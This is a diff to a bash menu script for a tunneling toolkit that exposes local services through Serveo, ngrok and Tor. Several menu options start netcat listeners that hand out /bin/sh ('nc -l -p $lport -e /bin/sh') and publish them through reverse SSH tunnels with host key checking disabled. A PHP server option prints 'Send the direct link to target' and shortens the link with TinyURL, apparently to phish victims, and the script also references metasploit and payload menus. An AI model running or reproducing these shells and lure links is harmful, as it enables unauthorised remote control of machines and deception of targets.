@@ -14,9 +14,11 @@ OSType=""
 
 startmenu() {
 	banner
-	printf "\e[92m  Serveo SSH Reverse Tunneling                               =  1\n"
+	printf "\e[92m  Tunneling...\n"
+	printf "  SSH Tunneling                                              =  1\n"
 	printf "  NGROK Reverse Tunneling                                    =  2\n"
-#	printf "  Localhost.run SSH PHP Reverse Tunneling                    =  3\n"
+	printf "  Serveo SSH Reverse Tunneling                               =  3\n"
+#	printf "  Localhost.run SSH PHP Reverse Tunneling                    =  4\n"
 	if command -v tor > /dev/null 2>&1; then
 		printf "  TOR Reverse Tunneling & Hidden Service                     =  9\n"
 	fi
@@ -29,8 +31,16 @@ startmenu() {
 	read -p $'  Choose an option: \e[37;1m' option
 	case $option in
 		99) 	stop 1 ;;
-		1|01) 	menussh ;;
+		1|01) 	banner
+			printf "\e[92m  SSH tunneling...\n"
+			case $option in
+				1|01) lip; rip; printf "  SSH Username: "; read user; sshme $lport $rserver $rport $user "-L"; waitforit ;;
+				*)
+			esac
+			startmenu
+			;;
 		2|02) 	ngrokme; menungrok ;; 
+		3|03) 	menuserveo ;;
 		9|09) 	menutor ;;
 		10) 	menusocat ;;
 		20) 	menumetasploit ;;
@@ -70,69 +80,22 @@ startmenu() {
 }
 
 menussh() {
-	banner
 	printf "\e[92m  Reverse tunnel                                             =  1\n"
 	printf "  Run a NetCat listener reverse tunnel                       =  2\n"
 	printf "  Run a NetCat listener reverse connect - reverse tunnel     =  3\n"
 	printf "  Run a NoMachine listener reverse tunnel                    =  4\n"
 	printf "  Run a VNC listener reverse tunnel                          =  5\n"
-	printf "  Run PHP HTTP Server Through Serveo.net reverse tunnel      = 10\n"
-	printf "  Run Python HTTP Server Through Serveo.net reverse tunnel   = 11\n"	
+	printf "  Run PHP HTTP Server through reverse tunnel                 = 10\n"
+	printf "  Run Python HTTP Server through reverse tunnel              = 11\n"	
 	printf "  Exit                                                       = 99\n"
 	printf "\n"
 	read -p $'  Choose an option: \e[37;1m' option
-
-	if [[ $option == 99 ]]; then 
-		startmenu
-	fi
-	case $option in
-		1|01)   lip; rip
-			printf "\e[1;93m [!] Reverse tunnel from $rserver:$rport to localhost:$lport\e[0m\n"
-			serveoitforward $lport $rserver $rport
-			;;
-		2|02)   lip; rip			
-			nc -l -p $lport -e /bin/sh > /dev/null 2>&1 &
-			serveoitforward $lport $rserver $rport
-			menussh
-			;;
-		3|03)   lip; rip   
-			printf "\e[1;93m [!] Starting NetCat Server on port "$lport"!\e[0m\n"
-			nc -lvp -p $lport -e /bin/sh > /dev/null 2>&1 &
-			serveoitforward $lport $rserver $rport
-			;;
-		4|04)   lport="4000"
-			printf "\e[1;93m [!] Starting Nomachine on port"$lport"!\e[0m\n"
-			nomachineme
-			serveoitforward $lport $rserver $rport
-			;;
-		5|05)   lip; rip
-			printf "\e[1;93m [!] Starting VNC on port"$lport"!\e[0m\n"
-			vncserver -rfbport $lport
-			serveoitforward $lport $rserver $rport
-			;;
-		10)     lip;  httpserver="servephp"; serveserveo $lport menussh ;;
-		11)     lip;  httpserver="servepython"; serveserveo $lport menussh ;;
-		*)
-		printf "\e[1;93m [!] Invalid option!\e[0m\n"
-		sleep
-		clear
-		menussh
-		;;
-	esac
 }
 
 menungrok() {
 	banner
-	printf "\e[92m  Reverse Tunneling through Ngrok.io                         =  1\n"
-	printf "  Run a NetCat listener  reverse tunnels                     =  2\n"
-	printf "  Run a NetCat listener reverse conect -  reverse tunnels    =  3\n"
-	printf "  Run a NoMachine listener reverse tunnel                    =  4\n"
-	printf "  Run a VNC listener reverse tunnel                          =  5\n"
-	printf "  Run PHP HTTP Server Through Ngrok.io  reverse tunnels      = 10\n"
-	printf "  Run Python HTTP Server Through Ngrok.io  reverse tunnels   = 11\n"
-	printf "  Exit                                                       = 99\n"
-	printf "\n"
-	read -p $'  Choose an option: \e[37;1m' option
+	printf "\e[92m  Ngrok.io...\n"
+	menussh
 	if [[ $option == 99 ]]; then 
 		startmenu
 	fi
@@ -171,6 +134,50 @@ menungrok() {
 		;;
 	esac
 }
+
+menuserveo() {
+	banner
+	printf "\e[92m  Serveo.net...\n"
+	menussh
+
+	if [[ $option == 99 ]]; then 
+		startmenu
+	fi
+	case $option in
+		1|01)   lip; rip
+			printf "\e[1;93m [!] Reverse tunnel from $rserver:$rport to localhost:$lport\e[0m\n"
+			serveoitforward $lport $rserver $rport
+			;;
+		2|02)   lip; rip			
+			nc -l -p $lport -e /bin/sh > /dev/null 2>&1 &
+			serveoitforward $lport $rserver $rport
+			;;
+		3|03)   lip; rip   
+			printf "\e[1;93m [!] Starting NetCat Server on port "$lport"!\e[0m\n"
+			nc -lvp -p $lport -e /bin/sh > /dev/null 2>&1 &
+			serveoitforward $lport $rserver $rport
+			;;
+		4|04)   lport="4000"
+			printf "\e[1;93m [!] Starting Nomachine on port"$lport"!\e[0m\n"
+			nomachineme
+			serveoitforward $lport $rserver $rport
+			;;
+		5|05)   lip; rip
+			printf "\e[1;93m [!] Starting VNC on port"$lport"!\e[0m\n"
+			vncserver -rfbport $lport
+			serveoitforward $lport $rserver $rport
+			;;
+		10)     lip; rip;  httpserver="servephp"; serveserveo $lport ;;
+		11)     lip;  httpserver="servepython"; serveserveo $lport ;;
+		*)
+		printf "\e[1;93m [!] Invalid option!\e[0m\n"
+		sleep
+		clear
+		banner; menuserveo
+		;;
+	esac
+}
+
 
 menutor() {
 	banner
@@ -477,7 +484,7 @@ menupayloads() {
 
 lip() {
 	default_port="12345"
-	printf '\e[92mChoose a local listening port (Example:12345): ' $default_server
+	printf '\e[92m  Choose a local listening port (Example:12345): ' $default_server
 	read lport
 	lport="${lport:-${default_port}}"
 }
@@ -485,10 +492,10 @@ lip() {
 rip() {
 	default_rserver="serveo.net"
 	default_rport="12345"
-	printf '\e[92mChoose a remote server to recieve from (Example:'$default_rserver')\e[37;1m: '
+	printf '\e[92m  Choose a remote server to recieve from (Example:'$default_rserver')\e[37;1m: '
 	read rserver
 	rserver="${rserver:-${default_rserver}}"
-	printf '\e[92mChoose a remote port to send to (Example:'$default_rport')\e[37;1m: ' 
+	printf '\e[92m  Choose a remote port to send to (Example:'$default_rport')\e[37;1m: ' 
 	read rport
 	rport="${rport:-${default_rport}}"
 }
@@ -496,10 +503,10 @@ rip() {
 rfip() {
 	default_rrserver="towel.blinkenlights.nl"
 	default_rrport="23"
-	printf '\e[92mChoose a remote server to forward/pivot to (Example:'$default_rrserver')\e[37;1m: ' $default_rrserver
+	printf '\e[92m  Choose a remote server to forward/pivot to (Example:'$default_rrserver')\e[37;1m: ' $default_rrserver
 	read rrserver
 	rrserver="${rrserver:-${default_rrserver}}"
-	printf '\e[92mChoose a remote port to forward/pivot to (Example:'$default_rrport')\e[37;1m: ' $default_rrport
+	printf '\e[92m  Choose a remote port to forward/pivot to (Example:'$default_rrport')\e[37;1m: ' $default_rrport
 	read rrport
 	rrport="${rrport:-${default_rrport}}"
 }
@@ -531,6 +538,10 @@ nomachineme() {
 		wget https://download.nomachine.com/download/6.3/Linux/nomachine_6.3.6_1_amd64.deb
 		sudo dpkg -i nomachine_*_amd64.deb
 	fi
+}
+
+sshme () {
+	ssh $5 $1:127.0.0.1:$3 $4@$2
 }
 
 ngrokme() {
@@ -696,6 +707,11 @@ socatitforward() {
 	socat tcp-listen:$1,reuseaddr,fork TCP:$2:$3 &
 }
 
+servessh() {
+	printf "\e[92mStarting tunnel...\e[0m\n"
+	ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R $3:localhost:$1 $2
+	waitforit
+}
 
 serveoitforward() {
 	if  [[ ! -z "$OSType" ]]; then
@@ -709,18 +725,14 @@ serveoitforward() {
 		fi
 	else
 		printf "\e[1;92m[\e[0m*\e[1;92m] Opening with NetCat to test port \e[0m\e[1;77m %s\e[0m\n"
-		echo 'sleep 5; nc '$2 $3 > reverse-serveo-connect.sh
-		chmod +x reverse-serveo-connect.sh
-		xterm ./reverse-serveo-connect.sh &
+		echo 'sleep 5; nc '$2 $3 > reverse-ssh-connect.sh
+		chmod +x reverse-ssh-connect.sh
+		xterm ./reverse-ssh-connect.sh &
 	fi
-	printf "\e[92mStarting tunnel...\e[0m\n"
-	ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R $3:localhost:$1 $2
-	waitforit
+	servessh $1 $2 $3
 }
 
-
 serveserveo() {
-	# Modified from SHELLPHISH, AUTHOR: @thelinuxchoice
 	$httpserver $1
 	if [[ -e sendlink ]]; then
 		rm -rf sendlink
@@ -730,12 +742,10 @@ serveserveo() {
 	sleep 10
 	send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 	printf '\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n\n' $send_link
-	send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
-	printf '\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
-	printf "\n"
+	tinyurl $send_link
 	firefox $send_link $send_link/installs.php
 	read me
-	$2
+	menuserveo
 }
 
 servephp() {
@@ -763,6 +773,7 @@ servengrok() {
 	link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
 	printf "\e[1;92m[\e[0m*\e[1;92m] Congrats!!!  Your new server: \e[37;1m$link\n" 
 	printf "\n"
+	tinyurl
 	printf "\e[1;92m[\e[0m*\e[1;92m]Opening with Firefox in 3 seconds\n"
 	sleep 3 
 	firefox $link $link/installs.php
@@ -815,6 +826,12 @@ servetor() {
 	printf "\e[1;92m[\e[0m*\e[1;92m] You can connect to your new PHP Webserver using: \n    \e[37;1m> http://$hostname.to:$1 throught the Internet\n\n\e[92m"
 	printf "If the page doesn't load, wait a minute and try again...\n\n"
 	waitforit
+}
+
+tinyurl () {
+	tiny=$(curl -s http://tinyurl.com/api-create.php?url=$1 | head -n1)
+	printf '\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $tiny
+	printf "\n"
 }
 
 stop() {
